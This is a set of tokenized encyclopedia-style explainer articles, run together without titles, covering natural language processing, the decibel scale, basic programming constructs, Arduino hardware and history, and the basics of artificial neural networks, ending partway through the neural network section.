Sentences need to be ordered so that information is conveyed correctly .
NLU is about analysis .
NLG is about synthesis .
An NLP application may involve one or both .
Sentiment analysis and semantic search are examples of NLU .
Captioning an image or video is mainly an NLG task since input is not textual .
Text summarization and chatbot are applications that involve NLU and NLG .
There 's also Natural Language Interaction ( NLI ) of which Amazon Alexa and Siri are examples .
What 's the typical data processing pipeline in NLP ?
A typical text processing pipeline with optional coreference resolution .
Source : Geitgey 2018 .
A typical NLP pipeline consists of text processing , feature extraction and decision making .
All these steps could apply to classical NLP techniques , machine learning or neural networks .
Where ML and NN are used , we would have to train a model from a sufficient volume of data before it can be used for prediction and decision making .
In text processing , the input is just text and the output is a structured representation .
This is done by identifying words , phrases , parts of speech , and so on .
Since words have variations ( go , going , went ) , it 's common to reduce them to a root form with techniques such as stemming and lemmatization .
Common words that do n't add value to analysis ( the , to , and , etc .
) are called stop words and these are removed .
Punctuations are also removed to simplify analysis .
Named Entity Recognition ( NER ) involves identifying entities such as places , names , objects , and so on .
Coreference resolution tries to resolve pronouns ( he , they , it , etc .
) to the correct entities .
More formally , text processing involves analysis of three types : syntax ( structure ) , semantics ( meaning ) , pragmatics ( meaning in context ) .
What are some challenges that NLP needs to solve ?
NLU is still an unsolved problem .
Systems are as yet incapable of understanding the way humans do .
Until then , progress will be limited to better pattern matching .
Where NLU is lacking , it affects the success of NLG .
In the area of chatbots , there 's a need to model common sense .
It 's also not clear if models should begin with some understanding or should everything be learned using the technique of reinforcement learning .
The computing infrastructure needed to build a full - fledged agent that can learn from its environment is also tremendous .
Not much has been done for low - resource languages where the need for NLP is greater .
Africa alone has about 2100 languages .
We need to find a way to solve this even if training data is limited .
Current systems are unable to reason in large contexts , such as entire books or movie scripts .
Supervision with large documents is scarce and expensive .
Unsupervised learning has the problem of sample inefficiency .
Just measuring progress is a challenge .
We need datasets and evaluation procedures tuned to concrete goals .
Could you mention some of the tools used in NLP ?
In Python , two popular NLP tools are Natural Language Toolkit ( NLTK ) and SpaCy .
NLTK is supposedly slower and therefore not the best choice for production .
TextBlob extends NLTK .
Textacy is based on SpaCy and handles pre - processing and post - processing tasks .
There 's also PyTorch - NLP suited for prototyping and production .
AllenNLP and Flair are built on top of PyTorch for developing deep - - learning NLP models .
Intel NLP Architect is an alternative .
Gensim is a library that targets topic modelling , document indexing and similarity retrieval .
There are also tools in other programming languages .
In Node.js , we have Retext , Compromise , Natural and Nlp.js .
In Java , we have OpenNLP , Stanford CoreNLP and CogCompNLP .
The last two have Python bindings as well .
There are libraries in R and Scala as well , but these have n't been updated for over a year .
For execution , Jupyter Notebook provides an interactive environment .
If you do n't want to install Jupyter , it 's also available as a web service .
Azure Notebook Service is an example .
Via subscriptions , these services allow you to use powerful cloud computing resources .
In the area of automated translation , a dictionary look - up system developed at Birkbeck College , London can be seen as the first NLP application .
In the years following World War II , researchers attempted to translate German text to English .
Later , during the era of the Cold War , it was about translating Russian to English .
American linguist Noam Chomsky publishes Syntactic Structures .
Chomsky revolutionizes the theory of linguistics and goes on to influence the NLP a great deal .
The invention of the Backus - Naur Form notation in 1963 for representing programming language syntax is influenced by Chomsky 's work .
Another example is the invention of Regular Expressions in 1956 for specifying text search patterns .
In the U.S. , the Automatic Language Processing Advisory Committee ( ALPAC ) Report has been published .
It highlights the limited success of machine translation .
This resulted in a lack of funding right up to 1980 .
Nonetheless , NLP has advances in some areas , including case grammar and semantic representations .
Much of the work till late 1960s was about syntax , though some addressed semantic challenges .
In this decade , NLP is influenced by AI with a focus on world knowledge and meaningful representations .
Thus , semantics have become more important .
SHRDLU ( 1973 ) and LUNAR ( 1978 ) are two systems of this period .
Into the 1980s , this led to the adoption of logic for knowledge representation and reasoning .
The Prolog programming language was also invented in 1970 for NLP applications .
This decade sees the growing adoption of Machine Learning and thereby signalling the birth of statistical NLP .
Annotated bodies of text called corpora are used to train ML models to provide the gold standard for evaluation .
ML approaches to NLP became prominent in the 1990s , partly inspired by the successful application of Hidden Markov Models to speech recognition .
The fact that statistics have brought more success than linguistics is echoed by Fred Jelinek . Every time I fire a linguist , the performance of our speech recognition system goes up .
Project Jabberwacky was launched to simulate natural human conversations in the hope of passing the Turing Test .
This heralds the beginning of chatbots .
In October 2003 , Jabberwacky won third place in the Loebner Prize .
The FrameNet project is introduced .
This is related to semantic role modelling , a form of shallow semantic parsing that continues to be researched even in 2018 .
For language modelling , the classical N - Gram Model has been used in the past .
In 2001 , researchers proposed the use of a feed - forward neural network with vector inputs , now called word embeddings .
In later years , this led to the use of RNNs ( 2010 ) and LSTMs ( 2013 ) for language modelling .
Latent Dirichlet Allocation ( LDA ) was invented and has become widely used in machine learning .
It 's now the standard way to do topic modelling .
Improvements to word embedding along with an efficient implementation in Word2vec enable greater adoption of neural networks for NLP .
RNNs and LSTMs become obvious choices since they deal with dynamic input sequences so common in NLP .
CNNs from computer vision get repurposed for NLP since CNNs are more parallelizable .
Recursive Neural Networks attempt to exploit the hierarchical nature of language .
Microsoft launched Tay , a chatbot on Twitter that would interact with users and get better at conversing .
However , Tay is shut down within 16 hours after it learns to talk in racist and abusive language .
A few months later , Microsoft launched the Zo chatbot .
Google replaces its phrase - based translation system with Neural Machine Translation ( NMT ) that uses a deep LSTM network with 8 encoder and 8 decoder layers .
This reduces translation errors by 60 % .
This work is based on sequence - to - sequence learning proposed in 2014 , which later became a preferred technique for NLG .
Decibel is a unit of measurement that expresses the logarithmic ratio of two physical quantities of the same dimensions .
The logarithm is to base 10 .
This logscale definition is useful when the quantities have a wide range and losses or gains are proportional .
Decibels is dimensionless since it 's a ratio .
It 's a relative measure .
However , when a reference is defined , it can be used as an absolute measure .
As a relative measure , it 's represented as dB. As an absolute measure , often an additional suffix is appended to " dB " .
Decibel originated in telephone networks in the early 20th century .
Today , it 's commonly used in many domains , including acoustics , electrical engineering , signal processing , RF power , and more .
Could you explain the decibel scale with some numbers ?
Illustrating the decibel scale .
Source : Devopedia 2019 .
Decibel is defined as \(10\ log_{10}(P_1 / P_0)\ ) , where power level P1 is compared against P0 .
When P0 and P1 are equal , we say their ratio is 0dB. Thus , 0dB does n't imply zero power or intensity .
It implies equal power .
If P1 is twice the value of P0 , we say that P1 is 3dB higher than P0 .
If P1 is half the value of P0 , we say that P1 is 3dB lower than P0 , or equivalently -3dB. For ratios P1 / P0 equalling 10 , 100 , and 1000 , the respective decibels are 10 , 20 , and 30 .
Likewise , if the ratios are 0.1 , 0.01 , and 0.001 , the respective decibels are -10 , -20 , and -30 .
Thus , we can see that even though the power levels are changing geometrically , the equivalent decibel values change linearly .
This is why the logarithmic scale of decibels is useful when quantifying values that have a large range .
What are some examples where the decibel scale is used ?
Decibels are used to quantify the intensity of sound .
For sound , it 's common to use decibel with a reference of 0.02 mPa ( millipascals ) , the minimum sound that the human ear can hear .
Normal speech is at 60dB. A jet engine is at 120dB , which is a million times louder than normal speech .
In electrical engineering and radio engineering , decibels are used .
For example , the gain of an amplifier or the loss of signal power due to an obstruction are quantified in decibels .
A directional antenna will focus its radiation in specific directions , which are specified on a chart with decibels as the unit .
In signal processing , it 's common to apply filters to signals .
The Bode plot is an example that shows the magnitude response of such a filter : decibels ( y - axis ) vs frequency ( x - axis ) .
This tells which frequencies are allowed to pass and which ones are attenuated .
When a signal is compared to noise , called Signal - to - Noise Ratio ( SNR ) , this ratio is specified in decibels .
For example , we can compare a processed image with the original and quantify the difference as SNR in decibels .
What 's the difference between decibels based on either root - power level or power level ?
Decibels are commonly defined in terms of power levels .
However , it can be defined in terms of signal or field level .
For example , in electrical engineering , electrical signals are voltage and current .
Power is proportional to square of these signals .
When decibels is therefore defined in terms of voltage , the equation becomes \(20\ log_{10}(V_1 / V_0)\ ) , where voltage level V1 is compared against V0 .
While the term field quantity was previously used , ISO Standard 80000 - 1:2009 introduced the term root - power quantity .
What are absolute and relative decibel units ?
Absolute voltage levels dB&micro;V and dBV differ by 120dB. Source : Giangrandi 2000 .
Decibel is a relative measure that compares two quantities of the same dimension .
But in acoustics , it 's common to say that noise was at 90dB. We do n't say noise was 90dB with respect to something .
This is because a reference of 0.02 mPa ( millipascals ) is implied since it 's the quietest sound that we can hear .
Thus , sound levels are in absolute decibels .
In most other applications , dB is a relative measure .
When we say that path loss of a wireless channel is 120dB , we mean that from the transmitter to receiver , signal power drops by 120dB. However , if we take 1 milliwatt as the reference , then we can use the unit dBm to indicate an absolute measure .
If the transmitter sends a 10 kilowatt signal , it 's sending a 70dBm signal .
If path loss is 120dB ( relative measure ) , the receiver will get a -50dBm ( absolute measure ) signal .
Here are some examples of absolute measures ( reference in parenthesis ) : dBW ( 1 watt ) , dBi ( isotropic antenna ) , dBV ( 1 volt ) , dB&micro;V ( 1 microvolt ) , dB&micro;V / m or dBu ( 1&micro;V / m electrical field strength ) , dBA ( " A " weighted pressure levels ) , and more .
What are some limitations of using decibels ?
SNR and PSNR in decibels are used to indicate image quality .
Source : Sage 2017 .
In image processing , the Signal - to - Noise Ratio ( SNR ) and Peak Signal - to - Noise Ratio ( PSNR ) are sometimes used to compare a processed image with the original image .
SNR and PSNR are expressed in decibels .
The problem is that image quality is a matter of human perception .
We may sometimes perceive one image as better than another even though it has a lower SNR .
Admittedly , this is not a limitation of decibel itself , but rather a limitation of its usage for SNR .
There have been suggestions that decibels are outdated for the modern era .
This is probably due to incomplete understanding of logarithms and incorrectly mixing absolute and relative values .
Scottish mathematician John Napier ( aka Neper ) publishes a book detailing his invention of logarithms .
This would prove useful centuries later in the definition of the decibel .
In the early days of telephony , there was a need to quantify transmission losses due to links and nodes in a connection .
AT&T proposes using Mile of Standard Cable ( MSC ) , which is the equivalent of a mile of dry - core cable - pair with a loop resistance of 88 ohms and a mutual capacitance of 0.054 farads .
Let 's note that MSC is not a measure of distance , but one of loss , useful for comparing the efficiencies of two telephone circuits .
Example power ratios expressed in TU .
Source : Martin 1924 , pp .
407 .
MSC units have a dependency on frequency .
This was useful in earlier decades when there was a need to characterize distortion .
With newer circuits having much less distortion than the standard circuit , there 's a need for a distortionless unit .
Thus , AT&T invented the Transmission Unit ( TU ) to replace MSC .
TU is defined based on the logarithmic scale .
The logscale is useful since the losses due to two successive parts can simply be added instead of multiplied .
The International Advisory Committee on Long Distance Telephony in Europe , plus representatives of the Bell System , decided to adopt two units based on TU : bel based on power ratio \(10 ^ 1\ ) and neper based on power ratio \(e^2\ ) .
Since TU is based on power ratio \(10^.1\ ) , the Bell System decides to use decibel as the unit .
One decibel is the smallest difference in sound that the human ear can detect .
The word " bel " itself honours Alexander Graham Bell , inventor of the telephone .
By this time , in the UK at least , the unit of loss measurement becomes decibel rather than msc , though some other countries continue to use neper as the unit .
At the First International Acoustical Conference in Paris , decibel was adopted as an international unit for energy and pressure levels .
There 's talk of including the decibels within the International System of Units ( SI ) but this proposal is rejected .
However , decibels have been recognized by IEC and ISO .
Computers operate at a low level of bits and bytes that are difficult for humans to understand .
To program a computer , we use higher level languages that are closer to how humans think and reason .
These programming languages make it easier for us to instruct what a computer should do .
While there are dozens of programming languages , all of them share a number of basic constructs .
All languages must have constructs to do basic things such as initializing data , adding numbers , storing data , checking for certain conditions , repeating some tasks , and so on .
This article introduces these basic concepts to someone new to programming .
The actual syntax of each language may be different .
There are also different programming paradigms .
These are not covered in this article .
What 's the difference between hardware and software ?
Hardware refers to a physical device .
For example , a computer and its peripherals such as monitor , keyboard , and mouse are all part of the hardware .
Software is a set of instructions that are executed step by step to perform a specific task .
Software is otherwise called code or program .
Although we think of desktops and laptops as computing hardware , any device that executes a program can be considered a computing device .
Thus , digital cameras and smartphones contain both hardware and software .
Some devices , such as Wi - Fi routers and firewalls are called networking devices because of their specialized functions , but these too contain both hardware and software .
We may say that hardware is tangible and software is not .
Some say that hardware is about atoms and software is about bits .
This is because software is made of ones and zeros , which are the values that a bit can take .
Computing hardware without software does nothing and is therefore useless .
Software needs hardware to do its job .
Thus , both are needed for delivering a useful application .
Why do we need programming languages ?
Conversion of high - level code into machine code .
Source : Adapted from Peter D 2019 .
Computers have been designed to work with ones and zeroes .
They ca n't understand human languages .
However , writing a program with ones and zeros is extremely hard for human programmers .
Programming languages have therefore been invented for this reason .
Programs are written in high - level languages such as C , Java or Python .
Such languages are independent of the hardware architecture on which they are meant to execute .
This has the added advantage that the same program can be executed on different hardware .
There are tools called compilers or interpreters that translate high - level code into lower level instructions .
It 's possible to write programs using hardware - specific instructions called assembly - level languages .
In fact , compilers output assembly code .
Assemblers translate them into machine code of ones and zeroes .
A hand - crafted assembly code may be a more optimized code ( in terms of memory or speed ) .
The trade - off is that such code ca n't be reused across different hardware architectures .
What are the basic constructs of a programming language ?
Basic constructs of programming .
Source : Devopedia 2019 .
Here are some basic constructs of any language : Variables : These are names for easy storage and access of data .
A program is essentially about manipulating and storing data .
Expressions : Data needs to be manipulated and expressions involving mathematical operations are used to achieve this .
Assignments : The output of an expression , if it needs to be stored into a variable , is saved using an assignment .
Conditionals : Program execution sometimes involves branching based on conditions .
If some condition is true , do one thing ; if not true , do something else .
Loops : When something has to be repeated a number of times , loops are useful .
Loops typically have well - defined exit conditions .
For example , ` balance ` is a variable to refer to a person 's bank account balance .
The expression ` newbalance = balance - withdrawal ` calculates new balance from two variables and assigns the result to another variable .
The condition ` if ( balance > 0 ) ` checks if the balance is positive .
To calculate the sum of all withdrawals , stored in ` all_withdrawals ` , we would use a loop such as ` for i in all_withdrawals : total_withdrawals + = i ` , assuming that ` total_withdrawals ` is initialized to zero .
How is data stored and manipulated during program execution ?
Content stored in memory is of two types : instructions that are executed by the computer ; and data that is accessed and manipulated by instructions .
Using memory addresses , instructions point to relevant data that needs to be processed .
Variables are simply names that translate to memory addresses where their values are stored .
Consider the statement , ` a = a + b ` , where " a " and " b " are two variables .
In algebra , this equation implies that " b " must be zero .
In computing , this is not an equation but an assignment statement .
The right side is evaluated and the result is assigned to the left side .
For example , if " a " and " b " start with values 3 and 4 , after this execution , " a " will contain the value 7 while " b " will remain unchanged .
In this example , we are not concerned with preserving the original value of " a " and hence we overwrite it with the recent result .
To preserve the original value , we can introduce another variable ( memory location ) , ` c = a + b ` .
What are the common types of data ?
Data types in some languages .
Source : Kemp 1993 , table 3 .
Numeric data is mostly either an integer or a decimal .
Programmers can specify how much memory they wish to allocate to number variables using type names such as short , long , float , or double .
More memory implies a bigger range of values .
Among the non - numeric types is the character type .
A sequence of characters form a string .
Thus , " Hello World " is a string of characters , enclosed in quotes .
To store the result of conditionals , we have boolean types that have only two valid values : true or false .
It 's common to deal with a sequence of data values .
For example , we wish to store the names of all students in a single variable .
We can do this by creating a list or array data type .
Each item on the list can be accessed using an index .
In computing , indices often ( but not always ) start with zero .
Since arrays accept only integer indices , we can create an associative array ( also called map or dictionary ) that accepts strings as indices .
This is useful when storing key - value pairs .
What are conditional expressions ?
Boolean logic on combinations of A and B with Q as the result .
Source : Astels 2018 .
Any expression that yields a boolean result of either true or false can be considered a conditional expression .
For example , ` balance > 0 ` is a numerical comparison that has a boolean result ; ` lastname = = ' Smith ' ` is a string comparison that has a boolean result .
The purpose of such expressions is to do branching in code .
For example , if the account balance is positive , allow withdrawal ; else , show the customer an error message .
Conditional expressions can be combined using logical operators .
The most common of these are the " and " and " or " operators .
For example , ` firstname = = ' John ' and lastname = = ' Smith ' ` can be true only for John Smith .
Another example is ` balance < = 0 or accountDisabled ` where ` accountDisabled ` is of the boolean type .
If either condition is true , we disallow account withdrawal .
A value can be inverted using the " not " operator .
When combining multiple boolean expressions , Boolean logic is used to determine the final result .
What are the different ways of implementing loops ?
There are three main looping constructs .
Source : mbajada95 2017 .
There are three main looping constructs : do - while : One or more statements are executed , then a condition is checked .
If condition remains true , the next iteration of the loop is entered .
If the condition is false , the loop is exited .
while : Similar to do - while , but the condition if checked first .
This implies that statements within the loop may not be executed even once if the condition starts as false .
This is unlike do - while where the statements are executed at least once .
for : This starts with an initialization , such as initializing a loop counter .
Then the condition is checked , and if true , loop statements are executed .
Next , the loop counter is incremented before attempting the next iteration .
Statements within the loop can be any valid programming construct .
They can contain their own loops , resulting in nested loops .
They can contain conditions , which , if false , can help us exit the loop completely or skip following statements and move to the next iteration .
These are usually called ` break ` and ` continue ` loop statements respectively .
What are comments in the context of programming ?
A programmer may write excellent code , but he or she is most likely not the only person reading that code .
Other members of the development team and managers will read the code .
The code will be maintained and possibly improved by others .
To make it easier for others to understand the code , it 's good practice to write comments .
The purpose of comments is to explain what the code does , particularly those parts that may not be obvious .
Comments are meant for humans and are ignored by compilers and interpreters .
In other words , comments do n't affect program execution .
However , some tools process comments with the goal of automatically generating software documentation .
This documentation is again useful for only humans .
Some tools use comments to give hints and warnings to programmers while they write code .
This enables programmers to catch problems early .
What 's the purpose of functions , classes and methods ?
Illustrating a function in Python .
Source : Software Carpentry Foundation 2016 .
Modern applications are often complex , running into thousands or even millions of lines of code .
The solution is to break up a large program into small manageable units , each of which connects with other units via well - defined interfaces .
A function , also called a subroutine or a procedure , is a block of code that encapsulates a specific functionality .
It takes in input parameters , executes and returns an output .
Thus , functions can be called from other parts of code with different inputs .
They promote code reuse .
For example , ` float add(float a , float b ) ` is a function that takes two decimal numbers , adds them up and returns the result as a decimal number .
Calling ` add(2.3 , 1.2 ) ` should return 3.5 as result .
A class encapsulates not only code but also data and exposes well - defined interfaces .
Functions encapsulated within classes are called methods .
Consider ` Rectangle ` as a class with two data attributes ` length ` and ` breadth ` .
One of its methods could be ` float area ( ) ` that returns the rectangle 's area as a decimal number .
What tools does a programmer need to program a computer ?
To write code , the programmer needs at least one text editor .
A better approach is to use an Integrated Development Environment ( IDE ) .
IDEs provide a useful set of features out of the box .
These include language syntax highlighting , flagging programming errors , powerful code search , code formatting , and many more .
Code must be compiled or interpreted into their lower level instructions .
Thus , programmers need to install compilers or interpreters .
For example , C and C++ are compiled whereas JavaScript and Python are interpreted .
What if the program does n't work as expected during execution ?
What could the problem ?
This is where a debugger becomes useful .
A debugger can help us inspect the value of a variable step by step during program execution .
We can also ask the program to break at a specific line of code .
The code is undergoing changes .
To keep track of who has changed what , a Version Control System ( VCS ) such as Git is essential .
In coding projects , it 's common to use many other tools for planning , scheduling , tracking progress , or recording issues .
Ada Lovelace translates a French article written by Luigi Menabrea on the Analytical Engine invented by Charles Babbage .
She adds extensive notes to the translation detailing how the engine might be instructed by a sequence of operations to solve problems .
She is often regarded as the " world 's first programmer " .
George Boole publishes The Mathematical Analysis of Logic .
This shows the rules for manipulating expressions containing true and false values .
This later influenced the design of digital circuits and programming with boolean data types .
ENIAC is programmed using wires and switches .
Source : Calimero 2014 .
At the Moore School of Electrical Engineering of the University of Pennsylvania , work begins on ENIAC .
Unlike earlier electromechanical computers , ENIAC is electronic ( no moving parts ) and therefore more than a thousand times faster .
Possibly inspired by telephone switchboards , it 's programmed using panel wiring and switches .
It uses 18,000 vacuum tubes and weighs 30 tons .
An early flowchart to represent program flow .
Source : Goldstine and Neumann 1947 , fig .
7.10 .
Herman H. Goldstine and John von Neumann invented a graphical method to represent the execution flow of a program .
This is called a flow diagram , later named as flowchart .
Mathematician Grace Hopper completed an A-0 compiler that allows the use of English - like words instead of numbers to program a computer .
This marks the beginning of the move towards high - level programming languages and compilers .
Edgser Dijkstra publishes an article titled Go To Statement Considered Harmful .
Goto is a programming construct that allows execution to jump to another part of the code .
Dijkstra recognizes that excessive use of goto can result in confusing code .
The alternative is to adopt structured or procedural programming .
In modern programming languages , goto is not quite as bad since jumps are restricted .
Bjarne Stroustrup publishes The C++ Programming Language .
This makes C++ the dominant object - oriented language to tackle complex applications .
This decade saw the invention of a number of high - level languages : Python ( 1991 ) , Java ( 1994 ) , and JavaScript ( 1995 ) .
Python and JavaScript are interpreted languages .
Java is compiled into bytecode , which is then executed by the Java Virtual Machine .
A selection of Arduino boards and derivatives .
Source : jimblom 2019 .
Working with electronics and programming microcontroller - based systems is generally a difficult task that 's reserved for engineers .
What if we could simplify the process so that more people can participate , including designers and artists ?
This is why Arduino was invented back in 2005 .
Arduino is an open source platform for both software and hardware .
It uses a simplified programming syntax based on C / C++ languages .
Arduino boards can be easily programmed by anyone with a computer and a USB connection .
Arduino boards come in many variants and developers get to choose what suits their application .
The ecosystem around Arduino is rich with many third - party libraries , derivative boards , modules and shields .
Indeed , Arduino has been a catalyst for the Maker Movement .
What can I build with an Arduino ?
Example Arduino Projects .
Source : The Electronic Guy 2017 .
Arduino is a simple , low - cost platform to get started with DIY projects involving basic electronics and software .
It can be used for prototype applications involving sensors and motors for the Internet - of - Things ( IoT ) .
This means an Arduino can not only interface with real - world objects but also collect data and send them via the Internet to cloud applications .
You can use Arduino to automate routine tasks in your home , such as watering plants or opening doors for your pets .
You can build simple gadgets such as an LED matrix clock or a digital lock box .
For learning purposes , you can build a traffic light system .
More useful applications include fall detection for the elderly and ultrasonic glasses for the blind .
You can also use Arduino as a substitute for more expensive engineering tools such as an audio meter or an oscilloscope .
Among the simplest projects is to monitor and record temperature , humidity or pollution .
What are the licensing terms for Arduino ?
Arduino adopts the principles of open source for both hardware and software .
For the hardware , the original design files ( Eagle CAD ) are available under CC BY - SA licensing .
This allows for derivatives and commercial use but requires that attribution be given to Arduino .
Derived works must also be released as CC BY - SA .
There 's also an IDE to program the hardware , which uses the GPL license .
The code is in Java and available on GitHub .
C / C++ microcontroller libraries use the Lesser GPL license .
You can use the Arduino logo in tutorials , websites and community channels where the content is Arduino specific .
However , if you release your own design , you should not use either the name or the logo .
You can , however , say " XXX for Arduino " or " XXX ( Arduino - Compatible ) " .
Despite these licensing terms , there are counterfeits that violate Arduino trademarks .
There are also clones that are replicas of original designs but are branded differently .
Finally , there are derivatives that innovate on the original design and therefore add value to the Arduino ecosystem .
Examples include Teensy and Flora .
How do I power up an Arduino ?
There 's more than one way to power an Arduino Uno : USB port , DC power jack , or header pins .
Give power via VIN header pin for standalone battery - powered applications .
To power peripherals , 5V and 3.3V outputs are available .
Most Arduino variants run on 5V. Due , M0 and Yun Mini are some boards that use 3.3V. Voltage input range is 9 - 12V for the Uno via the DC jack ; 7 - 12V for Leonardo , Micro and Yun Mini ; 5 - 12V for Mega 2560 R3 ; 5 - 7V for Mini .
Note that smaller boards ( Nano , Micro , Mini ) lack DC power jack .
USB is also the interface to program the board .
While the Uno has USB A - B type , the Nano has mini - B USB .
Leonardo , Micro , and Due are some variants that use micro USB .
Could you explain the different memories on an Arduino ?
The following are the different Arduino memories : Flash : Used to store the program .
Arduino programs are called sketches .
They 're saved as ` * .ino ` files during development .
SRAM : Temporary storage for variables during program execution .
Contents are lost when the board is powered off .
EEPROM : Used for long - term storage .
Most boards have EEPROM but Due and M0 do n't have this .
ROM : Read - only memory for storing bootloader .
Programmed in a factory .
Available only on some boards such as Due .
What hardware interfaces are available on an Arduino ?
Main interfaces of Arduino Uno labelled .
Source : Hock - Chuan 2018 .
Arduino has many interfaces , often shared on the same physical pin .
A pin can be used for only one function at a time .
Among the interfaces are : General Purpose Input Output ( GPIO ) : For digital IO .
Useful for interfacing with button switches , LEDs , etc .
Pulse Width Modulation ( PWM ) : Mimics analogue output using digital pulses .
Useful for controlling motors , fading LEDs , etc .
Analogue Input : Uses a 10-bit Analogue - to - Digital Converter ( ADC ) to bring analogue signal values into the digital world .
used to read from an analogue sensor .
USART : For serial communications .
Used to send / receive data to / from laptop , Bluetooth device , etc .
LEDs Tx and Rx help us see serial activity .
Digital Interfaces : Other interfaces include I2C and SPI .
Used for interfacing with digital sensors or other peripherals such a memory , display , etc .
What are the different Arduino hardware variants ?
Comparing technical specs of many Arduino variants .
Source : Aidan 2018 .
The official Arduino product page lists all the variants .
Arduino hardware comes in three main types : Boards : These offer the main functionality .
Among the entry level boards are Uno , Leonardo , Micro , and Nano .
Boards with more features or better performance include the Mega 2560 , Zero , Due , and M0 Pro .
For the Internet of Things ( IoT ) , we need connectivity to the internet .
Some boards that offer this include Yun , Ethernet and Industrial 101 .
For wearable applications , the Lilypad series offer small form factor boards that can be sewn to cloth .
Modules : These are small form factor boards .
Modules giving IoT connectivity include Fox 1200 , WAN 1300 , GSM 1400 , NB 1500 , and WiFi 1010 .
Shields : These extend the hardware features provided by boards .
They ca n't be used on their own .
They connect to boards via well - defined interfaces .
There are shields for interfacing via USB , CAN , RS485 , and more .
How do I select an Arduino hardware for my application ?
Example applications with some Arduino variants .
Source : Mitchell 2018 .
You should start by listing application requirements in terms of performance , memory , connectivity , and interfaces .
The most popular one is the Arduino Uno .
Many shields are made compatible with the pin header of the Uno .
To fit into tight spaces , the Arduino Nano or Mini are cheaper and better options ; but shields ca n't be used with them .
For USB apps , I prefer Leonardo or Micro that are based on ATmega32U4 .
The Arduino Due has an ARM Cortex - M3 running at a faster clock , with more memory and interfaces than the Uno .
It runs on 3.3V , not 5V like the Uno .
Standard Arduino shields can be used .
The Arduino Mega has a similar form factor to the Due but uses ATmega2560 , not an ARM processor .
It runs on 5V and is therefore friendly to hobbyists .
Any project needing lots of GPIO can use Due or Mega .
If fast processing is needed , Due is a better choice .
Due is also good for analogue , with 12 inputs and 2 outputs .
More information is available at Core Electronics and Hackster .
At the MIT Media Lab , Casey Reas and Ben Fry invented Processing based on Java .
Processing is a graphical library and an IDE .
It simplifies programming syntax .
Later , Processing goes on to inspire other projects such as Wiring , Arduino and Fritzing .
From the first batch of wiring boards .
Source : Barragán 2016 .
Hernando Barragán created a wiring platform so that designers and artists could approach electronics and programming more easily .
Wiring itself is based on Processing .
It 's part of Barragán 's Master 's thesis project at the Interaction Design Institute Ivrea ( IDII ) in Italy .
In March 2004 , 25 wiring PCBs were manufactured and hand - soldered .
It was one of the first Arduino boards to come out in 2005 .
Source : Arduino 2019f .
While the wiring boards used ATmega128 , researchers at IDII forked the wiring code and added support for the cheaper ATmega8 .
They name the fork Arduino .
The first batch of Arduino boards are also made in the same year .
The Arduino Uno was released based on ATmega328P. clock is at 16MHz .
Memory includes 32 KB Flash , 2 KB RAM and 1 KB EEPROM .
Unlike the first Arduino of 2005 that used RS232 , the Uno uses a USB host interface and FTDI chip .
Arduino is due to be released .
This is the first 32-bit Arduino .
The first Arduino Day happens on 29th March .
This day now marks an annual event worldwide for people to share knowledge and exhibit their Arduino projects .
At the Maker Faire Bay Area , Massimo Banzi announces the creation of Genuino .
Due to trademark issues and legal disputes , Arduino trademark will be limited to the U.S. , for which Adafruit will be the manufacturer .
In other markets , the Genuino trademark will be used for manufacturing outside the U.S. In October 2016 , differences are put aside and the companies behind Arduino and Genuino announce a merger .
To enable code editing and programming boards from a web browser , Arduino Create has been released .
In January , to take care of manufacturing , Arduino AG was incorporated .
Later the same year , there 's talk of forming an Arduino Foundation to maintain the IDE and other code infrastructure in an open source community - driven manner .
Subsequently , not much information has been released about the Foundation .
To cater for IoT applications , Arduino announces the MKR Family of boards .
Most of these boards come with built - in wireless connectivity ; or they 're of smaller form factor .
Connectivity could be GSM , SigFox , or Wi - Fi .
In May , new boards supporting NB - IoT and Bluetooth were introduced .
Learning through ANN .
Source : Sharma .
2017b .
Artificial Neural Network ( ANN ) belongs to the field of Machine Learning .
It consists of computational models inspired by the human brain and biological neural networks .
The goal is to simulate human intelligence , reasoning and memory to solve forecasting , pattern recognition and classification problems .
ANN is effective in scenarios where traditional ML methods such as regression , time series analysis or PCA can not perform or forecast accurately .
This could be because of data bias , mix of continuous and categorical data , unclean or uncertain data .
Complex networks with multiple layers , nodes and neurons are possible today , thanks to the dramatic increase in computing power , super - efficient GPUs and Big Data .
A modern approach to ANN known as Deep Learning , which processes and transforms data cascading through hierarchical layers , has gained immense prominence .
Computer vision , character and image recognition , speech detection and NLP are the popular applications of ANN .
In what ways does ANN replicate the functioning of the human neural network ?
Biological Vs Artificial Neural Network .
Source : Roell .
2017 .
In a biological neural network , nerve cells ( neurons ) are interconnected by signal transmitters ( synapses ) which pass on electrical / chemical signals to a target neuron .
By summation of potential , either a signal to excite ( positive ) or inhibit ( negative ) is transmitted .
The human brain contains about 86 billion neurons on average .
When stimulated by an electrical pulse , neurotransmitters are released .
They cross into the synaptic gap between neurons and bind to chemical receptors in the receiving neuron .
This affects the potential charge of the receiving neuron , and starts up a new electrical signal in the receiving neuron .
The whole process takes less than 1/500th of a second .
As a message moves from one neuron to another , it is converted from an electrical signal to a chemical signal and back in an ongoing chain of events which is the basis of all brain activity .
To draw parallels with ANN , a network of data elements called artificial neurons receive input and change their internal state ( activation ) based on that input .
They then produce a result depending on the input value and the activation function .
What is the structure and function of an ANN ?
Structure of a Neuron and ANN .
Source : Vieira .
2017 .
The basic structure of an ANN involves a network of artificial neurons arranged into layers - one input layer , one output layer and one or more hidden layers in between .
Each neuron , with the exception of those in the input layer , receives and processes stimuli ( inputs ) from other neurons .
The processed information is available at the output end of the neuron .
Every connection has a weight ( positive or negative ) attached to it .
Positive weights activate the neuron while negative weights inhibit it .
The figure shows a network structure with inputs ( x1 , x2 , … xm ) being connected to a neuron with weights ( w1 , w2 , … wm ) on each connection .
The neuron sums all the signals it receives , with each signal being multiplied by its associated weights on the connection .
This output is then passed through a transfer ( activation ) function g(y ) that is normally non - linear to give the final output y. By comparing this output to actual value , we determine the error .
The process is repeated over several iterations until the error is within acceptable limits .
What are some key terms used in describing ANN ?
Perceptron example with weights .
Source : Sharma .
2017 .
We note the following terms : Perceptron - A linear binary classifier used in supervised learning .
It acts as a single - node neural network .
A neural network consists of multi - layer perceptrons ( MLPs ) .
Perceptrons consist of 4 parts – inputs , weights & bias , weighted sum and activation function .
All inputs x are multiplied with their weights w , then added to get a weighted sum .
This sum is applied to the activation function , to get the output of the perceptron .
Activation Function - A transfer function used to determine the output of a neural network .
It maps the resulting values into ranges ( 0 to 1 ) , ( -1 to 1 ) etc .
They may be linear or non - linear , the sigmoid function being one of them .
Weights and Biases - Weights assigned to an input indicate its strength .
